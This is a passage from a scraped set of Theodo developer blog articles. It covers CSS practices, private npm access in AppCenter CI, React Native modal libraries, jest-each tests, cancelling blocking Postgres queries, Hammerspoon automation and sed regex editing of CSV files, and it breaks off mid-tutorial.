</footer>\r\n</main>\r\n\r\n.link {\r\n    cursor: pointer;\r\n    color: blue;\r\n\r\n    &:hover {\r\n        color: black;\r\n    }\r\n}\r\n\r\n.footer {\r\n    border: 1px solid black;\r\n\r\n    &-link {\r\n        // You can use a mixin here if there is a need to factor in\r\n        // the common code with .link\r\n        cursor: pointer;\r\n        color: grey;\r\n    }\r\n}\r\n\nWhat you can do right now\nDo try to understand how CSS declarations really work\nThere are some declarations you really want to understand. Because if you don\u2019t there will still be a feeling of \u201cblack magic\u201d happening.\n\nvertical-align: middle; margin: 0 auto; all the things!\nWhat you should know (tip: if you think you would not be able to explain it clearly to someone else, click the links):\n\nThe box model (width, height, padding, margin, border, box-sizing, display: block/inline/inline-block).\nPositioning and positioning contexts (position: static/relative/absolute/fixed, z-index).\nTypography (font-size, font-weight, line-height, text-transform, text-align, word-break, text-overflow, vertical-align)\nSelectors (*, >, +, ::before, ::after, :hover, :focus, :active, :first-child, :last-child, :not(), :nth-child())\n\nBonus ones to go further:\n\nA complete guide to tables\nTransitions\nShadows & filters\nFloats (only if you have to. My advice would be: don\u2019t use floats).\n\nDo look at Flexbox and Grid\nIf your Definition of Done doesn\u2019t include older browsers and you don\u2019t use/know the flexbox and/or grid model, it will solve a lot of your layout problems. You may want to check these great tutorials:\n\nA complete guide to Flexbox (Chrome \u2265 21, Firefox \u2265 28, IE \u2265 10, Safari \u2265 6.1)\nA complete guide to Grid (Chrome \u2265 57, Firefox \u2265 52, IE \u2265 10, Safari \u2265 10.3), a short example of grid use\n\nAn example of a possible layout implementation possible with Grid and that is not a nightmare to implement:\n\nDo look at BEM and CSS modules/styled components and apply it to new components\nYou should use CSS guidelines such as BEM. It will make your code more maintainable/reusable and prevent you from going down into the specificity hell. Here is a great article on BEM which I recommend.\nFurthermore, if you have a component-based architecture (such as React, Vue or Angular), I recommend CSS modules or styled components to remove the naming hassle of BEM (here is an article on the whole topic).\nOpinion: there is one main gotcha with these tools. You may believe that the auto-scoping feature of these tools acts as a pseudo-magic protection. However, beware that you should not bypass the above Don\u2019ts. For instance, using HTML elements in CSS modules selectors destroys the purpose of auto-scoping because it will cascade to all children components. You should also keep a strict BEM-like approach (structuring your component styles into blocks, elements, and modifiers) while using these kinds of tools.\nDo challenge and remove useless CSS\nA lot can be done by using only seven CSS properties. Do challenge CSS that does not seems essential. Is this linear-gradient background color essential when nobody sees the gradient effect? Are those box-shadow declarations really useful?\nYou can also find unused CSS with Chrome\u2019s CSS coverage. In the \u201cMore tools\u201d drop-down, activate the \u201cCoverage\u201d tool, start recording and crawl your target pages. Here is an example showing that the .TextStat class is never used, as well as 70% of the whole stylesheet.\n\nDo it yourself\nA note on frameworks like Bootstrap and others: they are useful for small and quick projects when you don\u2019t have time to dedicate to style. But for many medium-sized and a lot of large-sized projects, don\u2019t use them.\nOver time, you will need to overwrite them and it will eventually take more time than doing it yourself because it will produce a more complex and more specific code.\nIn addition, doing your style yourself makes you learn a lot. UI designer is a whole job so creating a UI from scratch is a real challenge. At first, try to reproduce the same look and feel than other websites you like (you can look at the code with the browser dev tools). My personal experience is that I started to love and learn CSS the moment I threw Bootstrap out the window for a personal project and started writing my own style.\n\nI hope that with all the above best practices you will feel more comfortable writing CSS and that it will help you enhance your code quality. In Part 2 I will address the hassle of migrating a hellish complex stylesheet full of black magic to a clean, understandable and maintainable one. So don\u2019t hesitate to share your CSS horror stories!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlb\u00e9ric Trancart\r\n  \t\t\t\r\n  \t\t\t\tAlb\u00e9ric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAppCenter is a great CI platform for Mobile Apps. At Theodo we use it as the standard tool for our react-native projects.\nIn a recent project, we needed to have a shared NPM package between the React and React-Native applications. There is no mention of how to achieve this in the AppCenter documentation, and if you ask their support they will say it\u2019s not possible.\nMe: Hello, we\u2019re wanting to have a shared library used in our project. This would require an npm install from a private NPM repo (through package cloud). What is the best practice for adding a private npm access on the AppCenter CI?\nMicrosoft: We currently only support cloud git repositories hosted on VSTS, Bitbucket and GitHub. Support for private repos is not available yet but we are building new features all the time, you can keep an eye out on our roadmap for upcoming features.\nLuckily there is a way!\n\nAppCenter provides the ability to add an `appcenter-post-clone.sh` script to run after the project is cloned. To add one, just add a file named `appcenter-post-clone.sh`, push your branch and, on the configure build screen, see it listed.\n\nPro Tip: You need to press \u201cSave and Build\u201d on the build configuration after pushing a new post-clone script on an existing branch.\nNow, what to put in the script?\nHaving a .npmrc in the directory you run \u2018npm install\u2019 or \u2018yarn install\u2019 from allows you to pass authentication tokens for new registries.\nWe want a .npmrc like this:\n\r\nalways-auth=true\r\nregistry=https://YOUR_PACKAGE/NAME/:_authToken=XXXXXXXX\r\n\nObviously, we don\u2019t really want to commit our read token to our source code, therefore we should use an environment variable.\nSo we can add to our post-clone script:\n\r\ntouch .npmrc\r\necho \"always-auth=true\r\nregistry=https://YOUR_PACKAGE/NAME/:_authToken=${READ_TOKEN}\" > .npmrc\r\n\nNow, on AppCenter, we can go into the build configuration and add an environment variable called \u2018READ_TOKEN\u2019.\n\nNow rebuild your branch and your package installs should pass.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt some point during the development of your React Native application, you will use a Modal. A Modal is a component that appears on top of everything.\nThere are a lot of cool libraries out there for modals, so today, we\u2019ll have a look a the best libraries for different use cases.\nClick on \u201cTap to play\u201d on the playground below to start:\n\n\nYou can experience the app on your phone here and check the code on github.\nBefore choosing a library, you have to\u00a0answer those\u00a02 questions:\n\nWhat do I want to display in the modal ?\nHow great do I want the UX to be ?\n\nTo answer the 2nd question, we list a few criteria that make a good UX :\n1\ufe0f\u20e3 The user can click on a button to close the modal\n2\ufe0f\u20e3 The user can touch the background to close the modal\n3\ufe0f\u20e3 The user can swipe the modal to close it\n4\ufe0f\u20e3 The user can scroll inside the modal\nI)\u00a0Alert\nFirst, if you\u00a0simply want to display some information and perform an action based on\u00a0the decision of your user, you should probably go with a\u00a0native Alert. An alert is enough and provides a much simpler and more expected UX. You can see how it will look like below.\n\nII) Native modal\nIf you want to show more information to your user, like a picture or a customised button, you need a Modal. The simplest modal is the React Native modal. It gives you the bare properties to show and close the modal 1\ufe0f\u20e3, so it is really easy to use \u2705. The downside is that it requires some effort to customise so as to improve the user experience \u274c.\n\r\nimport { Modal } from \"react-native\";\r\n...\r\n        <Modal\r\n          animationType=\"slide\"\r\n          transparent={true}\r\n          visible={this.state.modalVisible}\r\n          onRequestClose={this.closeModal} // Used to handle the Android Back Button\r\n        >\r\n\nIII) Swipeable Modal\nIf you want to improve the UX, you can allow the user to swipe the modal away. For example, if the modal comes from the top like a notification, it feels natural to close it by pulling it up \u2b06\ufe0f. If it comes from the bottom, the user will be surprised if they cannot swipe it down \u2b07\ufe0f. It\u2019s even better to highlight the fact that they can swipe the modal with a little bar with some borderRadius. The best library for that use case would be the react-native-modal library. It is widely customisable and answers to criteria 1\ufe0f\u20e3, 2\ufe0f\u20e3 and 3\ufe0f\u20e3.\n\r\nimport Modal from \"react-native-modal\";\r\n...\r\n        <Modal\r\n          isVisible={this.state.visible}\r\n          backdropOpacity={0.1}\r\n          swipeDirection=\"left\"\r\n          onSwipe={this.closeModal}\r\n          onBackdropPress={this.closeModal}\r\n        >\r\n\nIV) Scrollable modal\nSo far so good, now let\u2019s see some more complex use cases. For instance, you may want the content of the modal to be scrollable (if you are displaying a lot of content or a Flatlist). The scroll may conflict with either the scroll of the modal or the scroll of the container of the Modal, if it is a scrollable component. For this use case, you can still use the react-native-modal library. You will have 1\ufe0f\u20e3, 2\ufe0f\u20e3 and 4\ufe0f\u20e3. You can control the direction of the swipe with\u2026 swipeDirection.\n\r\nimport Modal from \"react-native-modal\";\r\n...\r\n        <Modal\r\n          isVisible={this.state.visible}\r\n          backdropOpacity={0.1}\r\n          onSwipe={this.closeModal}\r\n          // swipeDirection={\"left\"} <-- We can't specify swipeDirection since we want to scroll inside the modal\r\n          onBackdropPress={this.closeModal}\r\n        >\r\n\n\u26a0\ufe0f Don\u2019t try to combine swipeable + scrollable with this library. Instead continue reading\u2026\nV) Swipeable + Scrollable modal\nThe previous libraries are already awesome, but if you want your modal to answer criteria 1\ufe0f\u20e3, 2\ufe0f\u20e3, 3\ufe0f\u20e3and 4\ufe0f\u20e3, you need\u00a0react-native-modalbox. This library is still very easy to use \u2705and has everything out of the box \u2705, and is listed in the awesome libraries by awesome-react-native. The only downside is that the modal from this library always appear from the bottom, and you can only swipe it down \u274c.\n\r\nimport Modal from \"react-native-modalbox\";\r\n...\r\n        <Modal\r\n          style={styles.container}\r\n          swipeToClose={true}\r\n          swipeArea={20} // The height in pixels of the swipeable area, window height by default\r\n          swipeThreshold={50} // The threshold to reach in pixels to close the modal\r\n          isOpen={this.state.isOpen}\r\n          onClosed={this.closeModal}\r\n          backdropOpacity={0.1}\r\n        >\r\n\nTo avoid the collision between the scroll of your content and the swipe to close the modal, you have to specify swipeArea and swipeThreshold.\nConclusion\nThere are a lot of libraries built on top of the native modal. It is important to choose the right one depending on your needs. If you want to control the direction of the swipe, use react-native-modal, but if you want the modal to only come from the bottom, use react-native-modalbox.\nThe libraries I\u2019ve talked about are amazing. Thanks to their contributors.\n\nPlease reach out if you think I missed something.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Garcia\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tjest-each is a small library that lets you write jest test cases with just one line.\nIt was added to Jest in version 23.0.1 and makes editing, adding and reading tests much easier. This article will show you how a jest-each test is written with examples of where we use it on our projects.\nA simple example jest test for a currencyFormatter function looks like this:\ndescribe('currencyFormatter', () => {\r\n  test('converts 1.59 to \u00a31.59', () => {\r\n    const input = 1.59;\r\n    const expectedResult = \"\u00a31.59\"\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n  test('converts 1.599 to \u00a31.60', () => {\r\n    const input = 1.599;\r\n    const expectedResult = \"\u00a31.60\"\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nThe currencyFormatter function takes in one number argument, input, and returns a string of the number to 2 decimal places with a \u00a3 prefix. Simple.\nBut, what if you want to add more test cases? Maybe you want your currencyFormatter to comma separate thousands, or handle non-number inputs in a certain way. With the standard jest tests above, you\u2019d have to add five more lines per test case.\nWith jest-each you can add new test cases with just one line:\ndescribe('currencyFormatter', () => {\r\n  test.each`\r\n    input     | expectedResult\r\n    ${'abc'}  | ${undefined}\r\n    ${1.59}   | ${'\u00a31.59'}\r\n    ${1.599}  | ${'\u00a31.60'}\r\n    ${1599}   | ${'\u00a31,599.00'}\r\n    // add new test cases here\r\n  `('converts $input to $expectedResult', ({ input, expectedResult }) => {\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nThere are 4 parts to writing a jest-each test:\n\nThe first line in the template string:\n\ntest.each`\r\n  input | expectedResult\r\n...\r\n`\r\n\nThis defines the variable names for your test, in this case input and expectedResult. Each variable must be seperated by a pipe | character, and you can have as many as you want.\n\nThe test cases:\n\n`...\r\n  ${'abc'}  | ${undefined}\r\n  ${1.59}   | ${'\u00a31.59'}\r\n  ${1.599}  | ${'\u00a31.60'}\r\n  ${1599}   | ${'\u00a31,599.00'}\r\n  // add new test cases here\r\n`\r\n...\r\n\nEach line after the first represents a new test. The variable values are set to the relevant variable names in the first row and they are also seperated by a pipe | character.\n\nPrint message string replacement:\n\n('$input converts to $expectedResult', ...)\r\n\nYou can customise the print message to include variable values by prefixing your variable names with the dollar symbol $. This makes it really easy to identify which test case is failing when you run your tests. For example, the print messages for the example test above looks like this:\n\n\nPassing the variables into the test:\n\n('$input converts to $expectedResult', ({ input, expectedResult }) => {\r\n  expect(someFunction(input)).toBe(expectedResult)\r\n})\r\n\nAn object of variables is passed to the test as the first argument of the anonymous function where you define your test assertions. I prefer to deconstruct the object in the argument.\njest-each with Older Versions of Jest\nYou can still use jest-each with older versions of Jest by installing it independently:\nnpm install jest-each\r\n\nThere are a just two things that you\u2019ll need to do differently in your test files:\n\nImport jest-each at the top of your test file\nUse each``.test instead of test.each``\n\nThe currencyFormatter test above would look like this instead:\nimport each from 'jest-each'\r\n\r\n describe('currencyFormatter', () = {\r\n   each`\r\n     input     | expectedResult\r\n     ${1.59}   | ${'\u00a31.59'}\r\n     ${1.599}  | ${'\u00a31.60'}\r\n     // add new test cases here\r\n   `.test('converts $input to $expectedResult', ({ input, expectedResult }) => {\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nAnd that\u2019s all there is to it! Now you have enough to start writing tests with jest-each!\njest-each Tests\nService Test Example\njest-each makes testing services, like a currencyFormatter, very quick and easy. It\u2019s also amazing for test driven development if that\u2019s how you like to develop. We have found it has been really useful for documenting how a service is expected to work for new developers joining a project because of how easy the test cases are to read.\nFor example:\nimport currencyFormatter from 'utils/currencyFormatter'\r\n\r\ndescribe('currencyFormatter', () => {\r\n  test.each`\r\n    input    | configObject | expectedResult | configDescription\r\n    ${'abc'} | ${undefined} | ${undefined}   | ${'none'}\r\n    ${5.1}   | ${undefined} | ${'\u00a35.10'}     | ${'none'}\r\n    ${5.189} | ${undefined} | ${'\u00a35.19'}     | ${'none'}\r\n    ${5}     | ${{dec: 0}}  | ${'\u00a35'}        | ${'dec: 0'}\r\n    ${5.01}  | ${{dec: 0}}  | ${'\u00a35'}        | ${'dec: 0'}\r\n    // add new test cases here\r\n  `('converts $input to $expectedResult with config: $configDescription',\r\n    ({ input, configObject, expectedResult} ) => {\r\n      expect(currencyFormatter(input, configObject)).toBe(expectedResult)\r\n    }\r\n  )\r\n})\r\n\nHere we have a slightly more complicated currencyFormatter function that takes an extra configObject argument. We want to test that:\n\nit returns undefined when input is not a number\nthe default number of decimal places is 2\nthat the configObject can set the number of decimal places with the dec key\n\nWe want to be able to identify the tests when they are running so we have also added a configDescription variable so we can add some text to the test\u2019s print message.\nHigher Order Component Test Example\nWe like to use jest-each to test and document the properties added to components by higher order components (HOCs). I\u2019ve found this simple test particularly helpful when refactoring our large codebase of HOCs, where it has prevented bugs on multiple occasions. We have even added a project snippet so that setting up this test for new HOCs is even easier:\nimport { shallow } from 'enzyme'\r\nimport HomePage from '/pages'\r\nimport isLoading from '/hocs'\r\n\r\nconst TestComponent = isLoading(HomePage)\r\n\r\ndescribe('wrapper', () => {\r\n  const component = shallow(<TestComponent/>)\r\n  test.each`\r\n    propName\r\n    ${'isLoading'}\r\n    // add new test cases here\r\n  `('wrapper adds $propName to the component', ({ propName }) => {\r\n    expect(Object.keys(component.props()).toContainEqual(propName)\r\n  })\r\n\r\n  test.each`\r\n    propName\r\n    ${'notThisProp'}\r\n    ${'orThisOne'}\r\n    // add new test cases here\r\n  `('wrapper does not add $propName to the component',\r\n    ({ propName }) => {\r\n      expect(Object.keys(component.props()).not.toContainEqual(propName)\r\n    }\r\n  )\r\n})\r\n\nSnapshot Branches Test Example\nYou can also test multiple snaphsot branches succintly by using jest-each:\nimport Button from '/components'\r\n\r\ndescribe('Component', () => {\r\n  const baseProps = {\r\n    disabled: false,\r\n    size: 'small',\r\n  }\r\n  test.each`\r\n    changedProps        | testText\r\n    ${{}}               | ${'base props'}\r\n    ${{disabled: true}} | ${'disabled = true'}\r\n    ${{size: 'large'}}  | ${'size = large'}\r\n    // add new test cases here\r\n  `('snapshot: $testText', ({ changedProps }) => {\r\n    const component = shallow(<Button {...baseProps} {...changedProps} />)\r\n    expect(component).toMatchSnaphot()\r\n  })\r\n})\r\n\nYou can learn more about snapshot tests here.\nThese three types of tests, plus some Cypress integration and end-to-end tests is enough for our current application\u2026 but that discussion is for another post.\nHappy testing with jest-each!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMike Riddelsdell\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHave you ever accidentally run a blocking migration on your Postgres database? Here\u2019s how to fix it in under 1 minute:\nFirst, connect to your database instance.\nNow, run the query: SELECT pid, query_start, query FROM pg_stat_activity\nThis will return a table listing all the processes running on the database, with the date they started and the query.\nIt should be easy to identify the pid (process id) of the blocking query\nNow run SELECT pg_cancel_backend([pid]) to cancel that transaction\nCongrats, you are done!\nFinally, you fool! If you want to avoid table locks you should avoid the following types of migration:\n\nAdding a new column with a default value\nChange the type of a column\nAdding a new non nullable column\nAdding a column with a uniqueness constraint\n\n What exactly are we doing here? \nThe table in Postgresql called pg_stat_activity is a record of all the processes currently running on the database at that moment. We use this to find the process ID of the thread controlling the overrunning transaction \u2013 we then use pg_cancel_backend function to cancel whatever process is running it.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJosh Warwick\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWhat is Hammerspoon and what can it do for me?\nHow often have you wanted a little something extra out of macOS, or it\u2019s desktop environment, but felt intimidated digging into the unwieldy system APIs? Well, fret no more!\nToday we will build the\u00a0neat little utility illustrated in the gif above and, hopefully, inspire you to build something yourself. To do this, we will be using Hammerspoon, an open-source project, which aims to bring staggeringly powerful macOS desktop automation into the Lua scripting language.\nThis allows you to quickly and easily write Lua code which interacts with the otherwise complicated macOS APIs, such as those for applications, windows, mouse pointers, filesystem objects, audio devices, batteries, screens, low-level keyboard/mouse events, clipboards, location services, wifi, and more.\nHaving been around for a few years, it is encouraging to know that there is a vibrant community developing Hammerspoon \u2014 with features and fixes being merged nearly every day! There is also a handy collection of user submitted snippets, known as \u201cspoons\u201d, which you can easily begin adding to your own configuration. You\u2019ll soon find yourself building up a personalised arsenal of productivity tools, there are few I\u2019ve found particularly helpful:\n\nSeal: pluggable launch bar \u2013 a viable alternative to Alfred;\nCaffeine: temporarily prevent the screen from going to sleep;\nHeadphoneAutoPause: play/pause music players when headphones are connected/disconnected. The reason as to why this isn\u2019t the default behaviour is beyond me\u2026\n\nGetting started with Hammerspoon\nIf you use brew cask, you can install Hammerspoon in seconds by running the command: brew cask install hammerspoon. If you don\u2019t use brew cask (you really should), you can download the latest release from GitHub then drag the application over to your /Applications/ folder. Afterwards, launch Hammerspoon.app and enable accessability.\nHopefully, by now you\u2019re convinced about how powerful Hammerspoon can be. So, let\u2019s give you a taste of how it works and dive into a code example. Having been inspired from a post I saw on /r/unixporn, we shall be creating a quick spoon which allows the user to draw a rectangle on top of the screen only to transform into a terminal window.\nCreate a rectangle which overlays on top of the screen, to indicate the size of the incoming terminal window:\n\nlocal rectanglePreviewColor = '#81ecec'\r\nlocal rectanglePreview = hs.drawing.rectangle(\r\n  hs.geometry.rect(0, 0, 0, 0)\r\n)\r\nrectanglePreview:setStrokeWidth(2)\r\nrectanglePreview:setStrokeColor({ hex=rectanglePreviewColor, alpha=1 })\r\nrectanglePreview:setFillColor({ hex=rectanglePreviewColor, alpha=0.5 })\r\nrectanglePreview:setRoundedRectRadii(2, 2)\r\nrectanglePreview:setStroke(true):setFill(true)\r\nrectanglePreview:setLevel('floating')\r\n\nOne of the really cool things about Hammerspoon is its ability to work alongside Open Scripting Architecture (OSA) languages, such as AppleScript. We\u2019ll be using this to create our new terminal window, with the desired position and size:\n\nlocal function openIterm()\r\n  local frame = rectanglePreview:frame()\r\n  local createItermWithBounds = string.format([[\r\n    if application \"iTerm\" is not running then\r\n      activate application \"iTerm\"\r\n    end if\r\n    tell application \"iTerm\"\r\n      set newWindow to (create window with default profile)\r\n      set the bounds of newWindow to {%i, %i, %i, %i}\r\n    end tell\r\n  ]], frame.x, frame.y, frame.x + frame.w, frame.y + frame.h)\r\n  hs.osascript.applescript(createItermWithBounds)\r\nend\r\n\nListen for when the user moves their mouse, so we can move and resize our rectanglePreview:\n\nlocal fromPoint = nil\r\n\r\nlocal drag_event = hs.eventtap.new(\r\n  { hs.eventtap.event.types.mouseMoved },\r\n  function(e)\r\n    toPoint = hs.mouse.getAbsolutePosition()\r\n    local newFrame = hs.geometry.new({\r\n      [\"x1\"] = fromPoint.x,\r\n      [\"y1\"] = fromPoint.y,\r\n      [\"x2\"] = toPoint.x,\r\n      [\"y2\"] = toPoint.y,\r\n    })\r\n    rectanglePreview:setFrame(newFrame)\r\n\r\n    return nil\r\n  end\r\n)\r\n\nBegin to capture the rectangle drawn by the user, as they hold ctrl + shift. Once released, cease capture, hide the rectangle and then open up our iTerm instance:\n\n  local flags_event =hs.eventtap.new(\r\n  { hs.eventtap.event.types.flagsChanged },\r\n  function(e)\r\n    local flags = e:getFlags()\r\n    if flags.ctrl and flags.shift then\r\n      fromPoint = hs.mouse.getAbsolutePosition()\r\n      local newFrame = hs.geometry.rect(fromPoint.x, fromPoint.y, 0, 0)\r\n      rectanglePreview:setFrame(newFrame)\r\n      drag_event:start()\r\n      rectanglePreview:show()\r\n    elseif fromPoint ~= nil then\r\n      fromPoint = nil\r\n      drag_event:stop()\r\n      rectanglePreview:hide()\r\n      openIterm()\r\n    end\r\n    return nil\r\n  end\r\n)\r\nflags_event:start()\r\n\nAnd that\u2019s all it takes!\nStepping into the future\nFeel free to check out my Hammerspoon config on GitHub, where you can find the coalesced version of the example above, along with my (upcoming) other spoons.\nIf you fancy giving a shot at writing your own spoons, here are a couple ideas to help get your creativity flowing:\n\nMove window focus directionally using the VIM movement keys (HJKL).\nWhen Spotify begins to play a new song, display an alert with the new song title, artist, etc\u2026\nInter-process communication and a simple HTTPServer enable you to trigger Hammerspoon functionality from pretty much any environment.\n\nFun fact: the name Hammerspoon is derived from itself being a \u201cfork\u201d of its lightweight predecessor Mj\u00f6lnir (that being the name of Thor\u2019s hammer \ud83d\udd28).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBraden Marshall\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tRecently I needed to transform a csv file with some simple processing. If you want to transform a file line by line, replacing a few things, deleting a few others, regular expressions are your friend.\nSed is a unix command line utility for modifying files line by line with regular expressions. It\u2019s simpler than awk, and works very similarly to the vim substitution you may be vaguely familiar with.\nWe\u2019re going to take a csv file and do the following with regex + sed:\n\nDelete some rows that meet a condition\nDelete a column (alright, I admit excel\u2019s not bad for this one)\nModify some cells in the table\nMove some data to its own column\n\nWe\u2019ll be using this mock csv file data set:\n\r\nname;id;thumbnail;email;url;admin;enabled\r\nDan Smith;56543678;dan_profile.jpg;dan@test.com;http://site.com/user/dan;false;true\r\nJames Jones;56467654;james_profile.png;james@test.com;http://site.com/user/james;false;true\r\nCl\u00e9ment Girard;56467632;clement_profile.png;clement@test.com;http://site.com/user/clement;false;false\r\nJack Mack;56485367;jack_profile.png;jack@test.com;http://site.com/user/jack;true;false\r\nChris Cross;98453;chris_profile.png;chrisk@test.com;http://site.com/user/chris;true;true\r\n\nRemoving some users\nFirst let\u2019s remove users who are not enabled (last column == false). Sed lets us delete any line that return a match for a regex.\nThe basic structure of a sed command is like this:\nsed 's/{regex match}/{substitution}/' <input_file >output_file\nThere\u2019s also a delete command, deleting any line that has a match:\nsed '/{regex match}/d' <input_file >output_file\nLet\u2019s use it\nsed '/false$/d' <test.csv >output.csv\n\nThat command deletes these line in the csv:\n\r\nCl\u00e9ment Girard;56467632;clement_profile.png;clement@test.com;http://site.com/user/clement;false;false\r\nJack Mack;56485367;jack_profile.png;jack@test.com;http://site.com/user/jack;true;false\r\n\nSome of our users also have an old user Id (only 5 digits). Let\u2019s delete those users from our csv too.\nsed -r '/;[1-9]{5};/d' <test.csv >output.csv\n\nThat command deletes this line in the csv:\n\r\nChris Cross;98453;chris_profile.png;chrisk@test.com;http://site.com/user/chris;true;true\r\n\nHere we\u2019re using the OR syntax: []. This means that the next\u00a0character in the match\u00a0will be one of the\u00a0chars between the braces, in this case it\u2019s a range of possible digits between 1 and 9.\nWe\u2019re also using the quantifier {}, it repeats the previous character match rule 5 times, so will match a 5 digit number.\nNote we added the -r flag to sed so that we could use regex quantifier. This flag enabled extended regular expressions, giving us extra syntax.\nRemoving a column\nNext we want to remove the admin column. Removing the \u2018admin\u2019 column title is easy enough, but let\u2019s use regex to remove the data. Our csv has 2 boolean columns, admin and enabled, we want to match both of these, and replace the match with just the \u2018enabled column\u2019, which we want to keep.\nsed -r 's/(true|false);(true|false)$/\\2/' <test.csv >output.csv\n\nIn this example we\u2019ve used capture groups. By surrounding a match in parentheses, we can save it to a variable \u2013 the first capture is saved to \u2018\\1\u2019, the second to \u2018\\2\u2019 etc.\nIn the substitution section of our sed string, we replaced the entire match with capture group \u2018\\2\u2019. In other words we\u2019ve replaced the final two columns in each row with just the final column, thus removing the second-to-last column from the csv.\nWe\u2019ve also used the pipe \u2018|\u2019 as an OR operator, to match \u2018true\u2019 or \u2018false\u2019.\nWe\u2019re left with a csv that looks like this:\n\r\nname;id;thumbnail;email;url;enabled\r\nDan Smith;56543678;dan_profile.jpg;dan@test.com;http://site.com/user/dan;true\r\nJames Jones;56467654;james_profile.png;james@test.com;http://site.com/user/james;true\r\n\nModifying cells in the table\nNext we\u2019re going to modify the url column to store the relative url rather than the absolute path. We can use a regex like this:\nsed 's_http:\\/\\/site[.]com\\/\\(.*\\)_\\1_' <test.csv >output.csv\nThis is very difficult to read because we have to escape each forward slash in the url with a backslash. Fortunately, we can change the sed delimiter from a forward slash to an underscore. This means we don\u2019t have to escape forward slashes in the regex part of our sed command:\nsed -r 's_http://site[.]com/(.*)_\\1_' <test.csv >output.csv\nThat\u2019s much more readable!\n\nHere we match any characters after the base url using .* (this will match everything after the base url in the row). We save that in a capture group, so we now have a string starting with the relative url. By substituting the match with this, we\u2019ve replaced the full url with the relative url.\nWe\u2019re left with a csv that looks like this:\n\r\nname;id;thumbnail;email;url;enabled\r\nDan Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true\r\nJames Jones;56467654;james_profile.png;james@test.com;user/james;true\r\n\nMoving data to its own column\nFinally, let\u2019s take a column and split it into 2, moving some of its data to the new column. Let\u2019s replace the name column with \u2018first name\u2019 and \u2018last name\u2019. We can start by renaming the headers in the first row, then use sed + regex to split each row in our csv in 2 automatically!\nWe could start with this:\nsed -r 's/^([a-zA-Z]* )/\\1;/' <test.csv >output.csv\n\nHere we use OR square bracket [] notation again. In this case we match a character in a range of upper or lower case alphabetical characters. On Ubuntu Linux, this matches international alphabet characters like \u00e9, but this depends on your environment.\nWe save everything up to a space character (which delimits the first name from the last name) into a capture group and substitute it with itself plus a \u2018;\u2019 \u2013 thus moving first name into its own column.\nThe problem with this is our first name is left with a trailing space character before the column delimiter (;). It would look like 